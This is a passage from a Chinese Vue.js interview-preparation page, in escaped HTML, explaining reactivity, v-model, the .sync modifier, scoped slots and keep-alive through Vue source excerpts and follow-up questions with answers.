\\n  const dep = new Dep();  \\n  Object.defineProperty(obj, key, {  \\n    get() {  \\n      Dep.target &amp;&amp; dep.addDep(Dep.target);// Dep.target也就是Watcher实例  \\n      return val;  \\n    },  \\n    set(newVal) {  \\n      if (newVal === val) return;  \\n      dep.notify(); // 通知dep执行更新方法  \\n    },  \\n  });  \\n}  \\n</code></pre>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>你手写的迷你 <code>Vue</code> 能把 <code>{&lt;span class=&quot;vp-brace-split&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt;{ name }&lt;span class=&quot;vp-brace-split&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt;}</code> 初次渲染出来，但执行 <code>vm.name = \'new\'</code> 后页面不变；沿着双向绑定链路最可能缺了哪一段？</strong></p>\\n<p>初始插值成功只说明编译阶段读到了数据，后续更新还需要 <code>getter</code> 收集 <code>Watcher</code>、<code>setter</code> 调用对应 <code>Dep.notify()</code>。应检查 <code>defineReactive</code> 是否为每个键创建 <code>Dep</code>，以及更新函数是否真正修改目标节点；缺少任一环节都只会得到单次渲染。</p>\\n</li>\\n<li>\\n<p><strong>资料编辑页中 <code>{&lt;span class=&quot;vp-brace-split&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt;{ profile.name }&lt;span class=&quot;vp-brace-split&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt;}</code> 出现三次，修改一次数据只更新了第一处；你的 <code>Dep</code> 里保存单个 <code>Watcher</code>，该怎么修？</strong></p>\\n<p>同一个响应式键可能被多个视图位置依赖，<code>Dep</code> 必须维护一组 <code>Watcher</code>，在 <code>notify()</code> 时逐个调用更新函数。若只保存最后一个或第一个订阅者，其余节点就会失联；还应避免无控制地重复收集同一依赖。</p>\\n</li>\\n<li>\\n<p><strong>团队实现响应式时在 <code>setter</code> 中先调用 <code>dep.notify()</code>，却忘了把闭包里的 <code>val</code> 更新为 <code>newVal</code>，输入框显示会出现什么问题？</strong></p>\\n<p>通知虽然发出了，但 <code>Watcher.update()</code> 再读取该键时仍得到旧的 <code>val</code>，视图会回退或保持旧值。<code>setter</code> 应在确认值发生变化后保存 <code>newVal</code>，再通知依赖；还要对新赋入的对象继续做响应化，否则其内部字段可能无法追踪。</p>\\n</li>\\n<li>\\n<p><strong>一个页面创建两个独立视图依赖时，第二个 <code>Watcher</code> 莫名订阅到第一个字段；实现里用全局 <code>Dep.target</code>，你会重点检查什么？</strong></p>\\n<p>检查创建 <code>Watcher</code> 时是否先设置 <code>Dep.target</code>，触发目标字段的 <code>getter</code> 后立即清空，避免后续读取误收集。全局目标位只适合表达当前正在求值的订阅者；遇到嵌套求值时，简单覆盖与清空还可能丢失外层目标，需要更严谨的目标管理。</p>\\n</li>\\n<li>\\n<p><strong>架构师提议只在模板编译时记录“字段到 <code>DOM</code>”的静态映射，省掉 <code>Watcher</code> 和 <code>Dep</code>；面对同一字段多处使用及后续更新，这个方案缺什么？</strong></p>\\n<p>静态映射能处理简单插值，却缺少统一的依赖订阅与变更通知机制，字段更新后仍要自行定位并执行每个节点的更新函数。<code>Dep</code> 管理一个键的多个 <code>Watcher</code>，<code>Watcher</code> 封装具体更新动作；代价是需要维护订阅生命周期和去重。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_23-v-model双向绑定原理\\"><a class=\\"header-anchor\\" href=\\"#_23-v-model双向绑定原理\\">#</a> 23 v-model双向绑定原理</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>本质是<strong>语法糖</strong>：绑定一个值 + 监听一个事件，把新值写回</li>\\n<li>原生元素上按类型展开不同：<code>input</code>/<code>textarea</code> 是 <code>:value</code> + <code>@input</code>，<code>checkbox</code>/<code>radio</code> 是 <code>:checked</code> + <code>@change</code>，<code>select</code> 是 <code>:value</code> + <code>@change</code></li>\\n<li>编译产物里还会处理<strong>输入法组合事件</strong>（<code>compositionstart</code>/<code>end</code>），避免中文输入过程中就把拼音写回数据</li>\\n<li>组件上：<code>Vue 3</code> 展开为 <code>:modelValue</code> + <code>@update:modelValue</code>，支持 <code>v-model:title</code> 这种多值绑定</li>\\n<li>修饰符：<code>.lazy</code>（改用 <code>change</code> 事件）、<code>.number</code>、<code>.trim</code></li>\\n</ul>\\n<p><strong><code>v-model</code> 本质上是“属性绑定加事件监听”的语法糖，事件触发后再把新值写回数据。</strong> 文本框和文本域对应 <code>value</code>、<code>input</code>，复选框和单选框对应 <code>checked</code>、<code>change</code>，下拉框则使用 <code>value</code>、<code>change</code>。自定义组件中，它默认转换成 <code>value</code> 属性和 <code>input</code> 事件。运行时还会处理输入法组合事件，避免中文拼音尚未确认就更新数据。</p>\\n</section>\\n<h3 id=\\"v-model实现原理\\"><a class=\\"header-anchor\\" href=\\"#v-model实现原理\\">#</a> v-model实现原理</h3>\\n<blockquote>\\n<p>我们在 <code>vue</code> 项目中主要使用 <code>v-model</code> 指令在表单 <code>input</code>、<code>textarea</code>、<code>select</code> 等元素上创建双向数据绑定，我们知道 <code>v-model</code> 本质上不过是语法糖（可以看成是<code>value + input</code>方法的语法糖），<code>v-model</code> 在内部为不同的输入元素使用不同的属性并抛出不同的事件：</p>\\n</blockquote>\\n<ul>\\n<li><code>text</code> 和 <code>textarea</code> 元素使用 <code>value</code> 属性和 <code>input</code> 事件</li>\\n<li><code>checkbox</code> 和 <code>radio</code> 使用 <code>checked</code> 属性和 <code>change</code> 事件</li>\\n<li><code>select</code> 字段将 <code>value</code> 作为 <code>prop</code> 并将 <code>change</code> 作为事件</li>\\n</ul>\\n<p><strong>所以我们可以v-model进行如下改写：</strong></p>\\n<pre class=\\"language-html\\"><code>&lt;input v-model=&quot;sth&quot; /&gt;\\n&lt;!-- 等同于 --&gt;\\n&lt;input :value=&quot;sth&quot; @input=&quot;sth = $event.target.value&quot; /&gt;\\n</code></pre>\\n<blockquote>\\n<p>当在<code>input</code>元素中使用<code>v-model</code>实现双数据绑定，其实就是在输入的时候触发元素的<code>input</code>事件，通过这个语法糖，实现了数据的双向绑定</p>\\n</blockquote>\\n<ul>\\n<li>这个语法糖必须是固定的，也就是说属性必须为<code>value</code>，方法名必须为：<code>input</code>。</li>\\n<li>知道了<code>v-model</code>的原理，我们可以在自定义组件上实现<code>v-model</code></li>\\n</ul>\\n<pre class=\\"language-js\\"><code>//Parent\\n&lt;template&gt;\\n  {{num}}\\n  &lt;Child v-model=&quot;num&quot;&gt;\\n&lt;/template&gt;\\nexport default {\\n  data(){\\n    return {\\n      num: 0\\n    }\\n  }\\n}\\n\\n//Child\\n&lt;template&gt;\\n  &lt;div @click=&quot;add&quot;&gt;Add&lt;/div&gt;\\n&lt;/template&gt;\\nexport default {\\n  props: [&#39;value&#39;], // 属性必须为value\\n  methods:{\\n    add(){\\n      // 方法名为input\\n      this.$emit(&#39;input&#39;, this.value + 1)\\n    }\\n  }\\n}\\n</code></pre>\\n<p><strong>原理</strong></p>\\n<p>会将组件的 <code>v-model</code> 默认转化成<code>value+input</code></p>\\n<pre class=\\"language-js\\"><code>const VueTemplateCompiler = require(&#39;vue-template-compiler&#39;); \\nconst ele = VueTemplateCompiler.compile(&#39;&lt;el-checkbox v-model=&quot;check&quot;&gt;&lt;/el- checkbox&gt;&#39;); \\n\\n// 观察输出的渲染函数：\\n// with(this) { \\n//     return _c(&#39;el-checkbox&#39;, { \\n//         model: { \\n//             value: (check), \\n//             callback: function ($$v) { check = $$v }, \\n//             expression: &quot;check&quot; \\n//         } \\n//     }) \\n// }\\n</code></pre>\\n<pre class=\\"language-js\\"><code>// 源码位置 core/vdom/create-component.js line:155\\n\\nfunction transformModel (options, data: any) { \\n    const prop = (options.model &amp;&amp; options.model.prop) || &#39;value&#39; \\n    const event = (options.model &amp;&amp; options.model.event) || &#39;input&#39; \\n    ;(data.attrs || (data.attrs = {}))[prop] = data.model.value \\n    const on = data.on || (data.on = {}) \\n    const existing = on[event] \\n    const callback = data.model.callback \\n    if (isDef(existing)) { \\n        if (Array.isArray(existing) ? existing.indexOf(callback) === -1 : existing !== callback ) {\\n            on[event] = [callback].concat(existing) \\n        } \\n    } else { \\n        on[event] = callback \\n    } \\n}\\n</code></pre>\\n<p>原生的 <code>v-model</code>，会根据标签的不同生成不同的事件和属性</p>\\n<pre class=\\"language-js\\"><code>const VueTemplateCompiler = require(&#39;vue-template-compiler&#39;); \\nconst ele = VueTemplateCompiler.compile(&#39;&lt;input v-model=&quot;value&quot;/&gt;&#39;);\\n\\n// with(this) { \\n//     return _c(&#39;input&#39;, { \\n//         directives: [{ name: &quot;model&quot;, rawName: &quot;v-model&quot;, value: (value), expression: &quot;value&quot; }], \\n//         domProps: { &quot;value&quot;: (value) },\\n//         on: {&quot;input&quot;: function ($event) { \\n//             if ($event.target.composing) return;\\n//             value = $event.target.value\\n//         }\\n//         }\\n//     })\\n// }\\n</code></pre>\\n<blockquote>\\n<p>编译时：不同的标签解析出的内容不一样 <code>platforms/web/compiler/directives/model.js</code></p>\\n</blockquote>\\n<pre class=\\"language-js\\"><code>if (el.component) { \\n    genComponentModel(el, value, modifiers) // component v-model doesn&#39;t need extra runtime \\n    return false \\n} else if (tag === &#39;select&#39;) { \\n    genSelect(el, value, modifiers) \\n} else if (tag === &#39;input&#39; &amp;&amp; type === &#39;checkbox&#39;) { \\n    genCheckboxModel(el, value, modifiers) \\n} else if (tag === &#39;input&#39; &amp;&amp; type === &#39;radio&#39;) { \\n    genRadioModel(el, value, modifiers) \\n} else if (tag === &#39;input&#39; || tag === &#39;textarea&#39;) { \\n    genDefaultModel(el, value, modifiers) \\n} else if (!config.isReservedTag(tag)) { \\n    genComponentModel(el, value, modifiers) // component v-model doesn&#39;t need extra runtime \\n    return false \\n}\\n</code></pre>\\n<blockquote>\\n<p>运行时：会对元素处理一些关于输入法的问题 <code>platforms/web/runtime/directives/model.js</code></p>\\n</blockquote>\\n<pre class=\\"language-js\\"><code>inserted (el, binding, vnode, oldVnode) { \\n    if (vnode.tag === &#39;select&#39;) { // #6903 \\n    if (oldVnode.elm &amp;&amp; !oldVnode.elm._vOptions) { \\n        mergeVNodeHook(vnode, &#39;postpatch&#39;, () =&gt; { \\n            directive.componentUpdated(el, binding, vnode) \\n        }) \\n    } else { \\n        setSelected(el, binding, vnode.context) \\n    }\\n    el._vOptions = [].map.call(el.options, getValue) \\n    } else if (vnode.tag === &#39;textarea&#39; || isTextInputType(el.type)) { \\n        el._vModifiers = binding.modifiers \\n        if (!binding.modifiers.lazy) { \\n            el.addEventListener(&#39;compositionstart&#39;, onCompositionStart) \\n            el.addEventListener(&#39;compositionend&#39;, onCompositionEnd) \\n            // Safari &lt; 10.2 &amp; UIWebView doesn&#39;t fire compositionend when \\n            // switching focus before confirming composition choice \\n            // this also fixes the issue where some browsers e.g. iOS Chrome\\n            // fires &quot;change&quot; instead of &quot;input&quot; on autocomplete. \\n            el.addEventListener(&#39;change&#39;, onCompositionEnd) /* istanbul ignore if */ \\n            if (isIE9) { \\n                el.vmodel = true \\n            }\\n        }\\n    }\\n}\\n</code></pre>\\n<h3 id=\\"vue中修饰符-sync与v-model的区别\\"><a class=\\"header-anchor\\" href=\\"#vue中修饰符-sync与v-model的区别\\">#</a> Vue中修饰符.sync与v-model的区别</h3>\\n<p><strong><code>sync</code>的作用</strong></p>\\n<ul>\\n<li><code>.sync</code>修饰符可以实现父子组件之间的双向绑定，并且可以实现子组件同步修改父组件的值，相比较与<code>v-model</code>来说,<code>sync</code>修饰符就简单很多了</li>\\n<li>一个组件上可以有多个<code>.sync</code>修饰符</li>\\n</ul>\\n<pre class=\\"language-html\\"><code>&lt;!-- 正常父传子 --&gt;\\n&lt;Son :a=&quot;num&quot; :b=&quot;num2&quot; /&gt;\\n\\n&lt;!-- 加上sync之后的父传子 --&gt;\\n&lt;Son :a.sync=&quot;num&quot; :b.sync=&quot;num2&quot; /&gt;\\n\\n&lt;!-- 它等价于 --&gt;\\n&lt;Son \\n  :a=&quot;num&quot; \\n  :b=&quot;num2&quot; \\n  @update:a=&quot;val=&gt;num=val&quot; \\n  @update:b=&quot;val=&gt;num2=val&quot; \\n/&gt;\\n\\n&lt;!-- 相当于多了一个事件监听，事件名是update:a, --&gt;\\n&lt;!-- 回调函数中，会把接收到的值赋值给属性绑定的数据项中。 --&gt;\\n</code></pre>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/a50931f6f3c0cf0c.png\\" alt=\\"\\"></p>\\n<p><strong><code>v-model</code>的工作原理</strong></p>\\n<pre class=\\"language-html\\"><code>&lt;com1 v-model=&quot;num&quot;&gt;&lt;/com1&gt;\\n&lt;!-- 等价于 --&gt;\\n&lt;com1 :value=&quot;num&quot; @input=&quot;(val)=&gt;num=val&quot;&gt;&lt;/com1&gt;\\n</code></pre>\\n<ul>\\n<li>相同点\\n<ul>\\n<li>都是语法糖，都可以实现父子组件中的数据的双向通信</li>\\n</ul>\\n</li>\\n<li>区别点\\n<ul>\\n<li>格式不同：<code>v-model=&quot;num&quot;</code>, <code>:num.sync=&quot;num&quot;</code></li>\\n<li><code>v-model</code>: <code>@input + value</code></li>\\n<li><code>:num.sync</code>: <code>@update:num</code></li>\\n<li><code>v-model</code>只能用一次；<code>.sync</code>可以有多个</li>\\n</ul>\\n</li>\\n</ul>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>商品编辑页里，子组件同时修改标题和价格，评审坚持只写一个 <code>v-model</code>，为什么这会让接口设计变得别扭？</strong></p>\\n<p>按题设中的 <code>Vue 2</code> 语义，单个组件的 <code>v-model</code> 默认对应 <code>value</code> 和 <code>input</code>，只适合承载一个主要值。标题和价格应分别使用 <code>:title.sync</code>、<code>:price.sync</code>，由子组件触发 <code>update:title</code> 和 <code>update:price</code>；强行合成对象会扩大更新范围，也会模糊字段边界。</p>\\n</li>\\n<li>\\n<p><strong>你封装地址选择器，父组件写了 <code>:province.sync=&quot;form.province&quot;</code>，但子组件直接执行 <code>this.province = code</code> 后控制台告警，该怎么改？</strong></p>\\n<p>子组件不应直接修改 <code>province</code> 这个 <code>prop</code>，而应执行 <code>this.$emit(\'update:province\', code)</code>，让父组件完成赋值。<code>.sync</code> 只是 <code>prop</code> 绑定与 <code>update:province</code> 监听的语法糖，并没有改变单向数据流；直接改 <code>prop</code> 仍可能被父组件下一次渲染覆盖。</p>\\n</li>\\n<li>\\n<p><strong>组件库里旧输入框约定 <code>value</code> 与 <code>input</code>，新需求又要同步 <code>loading</code> 和 <code>error</code>，你会怎样设计调用接口？</strong></p>\\n<p>输入值继续使用 <code>v-model</code>，由组件接收 <code>value</code> 并触发 <code>input</code>；<code>loading</code>、<code>error</code> 若确实需要由子组件反馈，则分别使用 <code>.sync</code> 对应的 <code>update:loading</code>、<code>update:error</code>。这样主值与附属状态职责清晰，但状态若完全由父级业务控制，就不应为了省代码滥用双向语法糖。</p>\\n</li>\\n<li>\\n<p><strong>订单弹窗里写了 <code>:visible.sync=&quot;open&quot;</code>，点击关闭按钮后界面不消失，但子组件日志显示已触发事件，你会先查哪几处？</strong></p>\\n<p>先核对事件名是否严格为 <code>update:visible</code>，以及载荷是否为期望的布尔值，再确认父级绑定表达式确实能被赋值。还要检查父组件是否紧接着又把 <code>open</code> 改回 <code>true</code>；<code>.sync</code> 只展开为事件监听和赋值，无法解决外部状态覆盖或事件拼写错误。</p>\\n</li>\\n<li>\\n<p><strong>表单组件既能用 <code>v-model</code>，也能把主字段写成 <code>:value.sync</code>，评审问两者是否完全等价，你怎么判断？</strong></p>\\n<p>两者都能形成父子数据回传，但事件契约不同：题设中的 <code>v-model</code> 使用 <code>value</code> 与 <code>input</code>，<code>:value.sync</code> 使用 <code>value</code> 与 <code>update:value</code>。应优先让组件的核心值遵循 <code>v-model</code>，多个独立属性再用 <code>.sync</code>；混用两套回传事件会增加维护和联调成本。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_24-什么是作用域插槽\\"><a class=\\"header-anchor\\" href=\\"#_24-什么是作用域插槽\\">#</a> 24 什么是作用域插槽</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>普通插槽的内容在<strong>父组件作用域</strong>编译，所以访问不到子组件的数据 —— 这是它的限制</li>\\n<li>作用域插槽让子组件通过 <code>&lt;slot :user=&quot;user&quot;&gt;</code> 把数据抛给父组件的模板，父组件用 <code>v-slot=&quot;{ user }&quot;</code> 接</li>\\n<li>实现差别：普通插槽编译成 <code>VNode</code>，<strong>作用域插槽编译成函数</strong>，子组件渲染到那里时才调用并传参</li>\\n<li>因此它还顺带解耦了父子更新 —— 子组件可以自己决定何时调用这个函数</li>\\n<li>典型场景：表格的列自定义渲染、列表项自定义、以及&quot;无渲染组件&quot;（只给逻辑不给 UI）</li>\\n</ul>\\n<p><strong>作用域插槽让子组件把内部数据作为参数交给父组件，由父组件决定这部分界面怎么渲染。</strong> 普通插槽内容在父组件作用域编译，因此不能直接访问子组件数据；作用域插槽则会被编译成函数，由子组件渲染时传参调用。比如列表组件负责取数和分页，父组件可以通过 <code>v-slot</code> 自定义每一项。它也常用于表格列和只提供逻辑、不固定界面的无渲染组件。</p>\\n</section>\\n<p>要理解作用域插槽，先看普通插槽的<strong>限制</strong>：</p>\\n<pre class=\\"language-vue\\"><code>&lt;!-- 父组件 --&gt;\\n&lt;UserList&gt;\\n  &lt;div&gt;{{ user.name }}&lt;/div&gt;   &lt;!-- ❌ user 是子组件的数据，父组件拿不到 --&gt;\\n&lt;/UserList&gt;\\n</code></pre>\\n<p><strong>普通插槽的内容在父组件作用域里编译</strong>，所以它只能访问父组件的数据。但列表这类组件的数据在子组件内部（子组件负责取数、分页、循环），父组件想自定义每一项怎么渲染就卡住了。</p>\\n<p><strong>作用域插槽就是让子组件把数据&quot;传&quot;给父组件的模板：</strong></p>\\n<pre class=\\"language-vue\\"><code>&lt;!-- 子组件 UserList.vue：通过 slot 上的属性把数据抛出去 --&gt;\\n&lt;template&gt;\\n  &lt;li v-for=&quot;user in users&quot; :key=&quot;user.id&quot;&gt;\\n    &lt;slot :user=&quot;user&quot; :index=&quot;user.index&quot;&gt;{{ user.name }}&lt;/slot&gt;\\n  &lt;/li&gt;\\n&lt;/template&gt;\\n\\n&lt;!-- 父组件：用 v-slot 接住 --&gt;\\n&lt;UserList&gt;\\n  &lt;template #default=&quot;{ user, index }&quot;&gt;\\n    &lt;span&gt;{{ index }} - {{ user.name }}&lt;/span&gt;\\n  &lt;/template&gt;\\n&lt;/UserList&gt;\\n</code></pre>\\n<p><strong>实现原理上的关键差别：</strong></p>\\n<table>\\n<thead>\\n<tr>\\n<th></th>\\n<th>普通插槽</th>\\n<th>作用域插槽</th>\\n</tr>\\n</thead>\\n<tbody>\\n<tr>\\n<td>编译成什么</td>\\n<td>一组 <code>VNode</code></td>\\n<td>一个<strong>函数</strong></td>\\n</tr>\\n<tr>\\n<td>什么时候求值</td>\\n<td>父组件渲染时</td>\\n<td>子组件渲染时调用该函数</td>\\n</tr>\\n<tr>\\n<td>作用域</td>\\n<td>父组件</td>\\n<td>参数来自子组件</td>\\n</tr>\\n</tbody>\\n</table>\\n<p>因为作用域插槽被编译成函数（<code>props =&gt; VNode</code>），子组件渲染到那个位置时才调用它并把数据当参数传进去 —— 这就绕开了&quot;作用域在编译时确定&quot;的限制。</p>\\n<p><strong>它还有一个性能上的副作用</strong>：普通插槽的内容属于父组件的渲染依赖，子组件更新时父组件也可能要重渲染；而作用域插槽是函数，子组件可以自己决定何时调用，父子更新解耦得更好。</p>\\n<p><strong>典型使用场景：</strong></p>\\n<ul>\\n<li><strong>表格组件</strong>：列的渲染方式由使用方决定（<code>el-table</code> 的 <code>slot-scope</code> 就是这个）</li>\\n<li><strong>列表/无限滚动</strong>：容器管数据和加载，每项长什么样由使用方定</li>\\n<li><strong>无渲染组件（Renderless Component）</strong>：组件只提供逻辑和状态，完全不渲染 UI，把一切交给作用域插槽 —— 这是组合式 API 出现之前复用逻辑的主流方案</li>\\n</ul>\\n<p>下面是从 <code>VNode</code> 角度看的更多细节：</p>\\n<p><strong>插槽</strong></p>\\n<ul>\\n<li>创建组件虚拟节点时，会将组件儿子的虚拟节点保存起来。当初始化组件时，通过插槽属性将儿子进行分类<code>{a:[vnode],b[vnode]}</code></li>\\n<li>渲染组件时会拿对应的 <code>slot</code> 属性的节点进行替换操作。（插槽的作用域为父组件）</li>\\n</ul>\\n<pre class=\\"language-html\\"><code>&lt;app&gt;\\n    &lt;div slot=&quot;a&quot;&gt;xxxx&lt;/div&gt;\\n    &lt;div slot=&quot;b&quot;&gt;xxxx&lt;/div&gt;\\n&lt;/app&gt; \\n\\nslot name=&quot;a&quot; \\nslot name=&quot;b&quot;\\n</code></pre>\\n<p><strong>作用域插槽</strong></p>\\n<ul>\\n<li>作用域插槽在解析的时候不会作为组件的孩子节点。会解析成函数，当子组件渲染时，会调用此函数进行渲染。（插槽的作用域为子组件）</li>\\n<li>普通插槽渲染的作用域是父组件，作用域插槽的渲染作用域是当前子组件。</li>\\n</ul>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/e2fdf798ea0f3d40.png\\" alt=\\"\\"></p>\\n<pre class=\\"language-js\\"><code>// 插槽\\n\\nconst VueTemplateCompiler = require(&#39;vue-template-compiler&#39;); \\nlet ele = VueTemplateCompiler.compile(` \\n    &lt;my-component&gt; \\n        &lt;div slot=&quot;header&quot;&gt;node&lt;/div&gt; \\n        &lt;div&gt;react&lt;/div&gt; \\n        &lt;div slot=&quot;footer&quot;&gt;vue&lt;/div&gt; \\n    &lt;/my-component&gt; `\\n)\\n    \\n// with(this) { \\n//     return _c(&#39;my-component&#39;, [_c(&#39;div&#39;, { \\n//         attrs: { &quot;slot&quot;: &quot;header&quot; },\\n//         slot: &quot;header&quot; \\n//     }, [_v(&quot;node&quot;)] // _文本及诶点 )\\n//     , _v(&quot; &quot;), \\n//     _c(&#39;div&#39;, [_v(&quot;react&quot;)]), _v(&quot; &quot;), _c(&#39;div&#39;, { \\n//         attrs: { &quot;slot&quot;: &quot;footer&quot; },\\n//         slot: &quot;footer&quot; }, [_v(&quot;vue&quot;)])]) \\n// }\\n\\nconst VueTemplateCompiler = require(&#39;vue-template-compiler&#39;);\\nlet ele = VueTemplateCompiler.compile(` \\n    &lt;div&gt;\\n        &lt;slot name=&quot;header&quot;&gt;&lt;/slot&gt; \\n        &lt;slot name=&quot;footer&quot;&gt;&lt;/slot&gt; \\n        &lt;slot&gt;&lt;/slot&gt; \\n    &lt;/div&gt; `\\n);\\n\\nwith(this) { \\n    return _c(&#39;div&#39;, [_v(&quot;node&quot;), _v(&quot; &quot;), _t(_v(&quot;vue&quot;)])]), _v(&quot; &quot;), _t(&quot;default&quot;)], 2) \\n}\\n//  _t定义在 core/instance/render-helpers/index.js\\n</code></pre>\\n<pre class=\\"language-js\\"><code>// 作用域插槽:\\nlet ele = VueTemplateCompiler.compile(` &lt;app&gt;\\n        &lt;div slot-scope=&quot;msg&quot; slot=&quot;footer&quot;&gt;{{msg.a}}&lt;/div&gt; \\n    &lt;/app&gt; `\\n);\\n\\n// with(this) { \\n//     return _c(&#39;app&#39;, { scopedSlots: _u([{ \\n//         // 作用域插槽的内容会被渲染成一个函数 \\n//         key: &quot;footer&quot;, \\n//         fn: function (msg) { \\n//             return _c(&#39;div&#39;, {}, [_v(_s(msg.a))]) } }]) \\n//         })\\n//     } \\n// }\\n\\nconst VueTemplateCompiler = require(&#39;vue-template-compiler&#39;);\\nVueTemplateCompiler.compile(` &lt;div&gt;&lt;slot name=&quot;footer&quot; a=&quot;1&quot; b=&quot;2&quot;&gt;&lt;/slot&gt; &lt;/div&gt; `);\\n\\n// with(this) { return _c(&#39;div&#39;, [_t(&quot;footer&quot;, null, { &quot;a&quot;: &quot;1&quot;, &quot;b&quot;: &quot;2&quot; })], 2) }\\n</code></pre>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>用户列表的数据由 <code>UserList</code> 内部请求，父页面在普通插槽里直接写 <code>{&lt;span class=&quot;vp-brace-split&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt;{ user.name }&lt;span class=&quot;vp-brace-split&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt;}</code> 却报 <code>user</code> 不存在，为什么不能沿着组件层级找到它？</strong></p>\\n<p>插槽内容在父组件作用域中编译，父模板只能直接访问父级可见的数据，不会因为被放进 <code>UserList</code> 就获得子组件变量。应由子组件写 <code>&lt;slot :user=&quot;user&quot;&gt;</code>，父级再用 <code>#default=&quot;{ user }&quot;</code> 接收；没有显式传出的内部状态仍不可访问。</p>\\n</li>\\n<li>\\n<p><strong>后台表格有十列数据，其中“操作”列要由业务页面渲染按钮，表格组件怎样开放能力又不绑定具体权限逻辑？</strong></p>\\n<p>表格组件负责循环行数据，并通过类似 <code>&lt;slot name=&quot;action&quot; :row=&quot;row&quot; :index=&quot;index&quot;&gt;</code> 暴露当前行和索引。业务页面用 <code>&lt;template #action=&quot;{ row }&quot;&gt;</code> 决定按钮及权限展示，使数据组织与业务渲染分离；暴露整行对象也意味着插槽契约变更需要谨慎。</p>\\n</li>\\n<li>\\n<p><strong>设计系统负责人想把所有作用域插槽改成普通插槽，理由是两者最终都生成 <code>VNode</code>，在子组件掌握分页数据的列表里会有什么后果？</strong></p>\\n<p>普通插槽虽然提供的是渲染内容，但不能凭空读取子组件当前行数据，因此无法完成逐项定制。作用域插槽会编译为接收参数并返回 <code>VNode</code> 的函数，由子组件渲染到对应位置时调用；改回普通插槽后，只能把数据上移或牺牲定制能力。</p>\\n</li>\\n<li>\\n<p><strong>无限滚动组件传出的是 <code>{ item, index }</code>，页面却写成 <code>#default=&quot;row&quot;</code> 后访问 <code>row.name</code> 得到空值，你会怎样定位？</strong></p>\\n<p>先检查插槽参数结构，<code>row</code> 此时代表整个插槽 <code>props</code> 对象，实际数据应从 <code>row.item.name</code> 读取，或直接解构为 <code>#default=&quot;{ item }&quot;</code>。再确认子组件是否在 <code>&lt;slot&gt;</code> 上绑定了 <code>:item</code>；作用域插槽只会传递明确声明的属性，不会自动暴露全部内部状态。</p>\\n</li>\\n<li>\\n<p><strong>团队在“作用域插槽”和传入 <code>renderRow</code> 函数之间争论，面向模板使用者的通用列表该选哪一个？</strong></p>\\n<p>两者本质上都能把数据交给外部渲染，但面向 <code>Vue</code> 模板的组件通常优先采用作用域插槽，调用方可直接使用指令和模板语法。渲染函数更适合调用方本就使用渲染 <code>API</code> 的场景；无论选哪种，都要稳定参数结构，否则业务页面会与内部数据模型紧耦合。</p>\\n</li>\\n<li>\\n<p><strong>无渲染组件只通过作用域插槽暴露加载状态和列表数据，迁移到组合式 <code>API</code> 后是否应该立刻删除这一层组件？</strong></p>\\n<p>若它只复用状态和请求逻辑，组合式函数通常能减少一层组件与插槽转发；若它还负责列表循环或固定结构，保留组件和作用域插槽仍更自然。取舍依据是逻辑是否依赖自己的渲染位置，迁移不能以改变现有插槽契约为代价。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_25-keep-alive原理\\"><a class=\\"header-anchor\\" href=\\"#_25-keep-alive原理\\">#</a> 25 keep-alive原理</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li><code>keep-alive</code> 是<strong>抽象组件</strong>（不渲染真实 <code>DOM</code>、不进父子链），作用是缓存组件实例而非销毁它</li>\\n<li>原理：内部维护 <code>cache</code> 对象和 <code>keys</code> 数组，<code>render</code> 时命中缓存就直接复用 <code>vnode.componentInstance</code></li>\\n<li>被缓存的组件不走 <code>mounted</code>/<code>destroyed</code>，改走 <code>activated</code>/<code>deactivated</code> —— 这是最容易踩的坑</li>\\n<li>三个配置：<code>include</code>/<code>exclude</code>（按组件名筛选）、<code>max</code>（按 <strong>LRU</strong> 淘汰最久未用的）</li>\\n<li>⚠️ 缓存的组件不销毁，里面的定时器、监听、<code>WebSocket</code> 也一直活着，要在 <code>deactivated</code> 里暂停</li>\\n</ul>\\n<p><strong><code>keep-alive</code> 是用于缓存组件实例的抽象组件，切换组件时会保留状态，而不是直接销毁实例。</strong> 它内部通过缓存对象保存 <code>VNode</code>，命中后复用其中的 <code>componentInstance</code>，并用 <code>keys</code> 记录访问顺序。<code>include</code> 和 <code>exclude</code> 控制缓存范围，<code>max</code> 超限时按照 <code>LRU</code> 淘汰最久未使用的实例。缓存组件再次显示会走 <code>activated</code>，隐藏时走 <code>deactivated</code>，需要刷新数据时可在这些时机处理。</p>\\n</section>\\n<h3 id=\\"keep-alive-使用场景和原理\\"><a class=\\"header-anchor\\" href=\\"#keep-alive-使用场景和原理\\">#</a> keep-alive 使用场景和原理</h3>\\n<ul>\\n<li><code>keep-alive</code> 是 <code>Vue</code> 内置的一个组件，<strong>可以实现组件缓存</strong>，当组件切换时不会对当前组件进行卸载。<strong>一般结合路由和动态组件一起使用</strong>，用于缓存组件</li>\\n<li>提供 <code>include</code> 和 <code>exclude</code> 属性，<strong>允许组件有条件的进行缓存</strong>。两者都支持字符串或正则表达式，<code>include</code> 表示只有名称匹配的组件会被缓存，<code>exclude</code> 表示任何名称匹配的组件都不会被缓存 ，其中 <code>exclude</code> 的优先级比 <code>include</code> 高</li>\\n<li>对应两个钩子函数 <code>activated</code> 和<code>deactivated</code> ，当组件被激活时，触发钩子函数 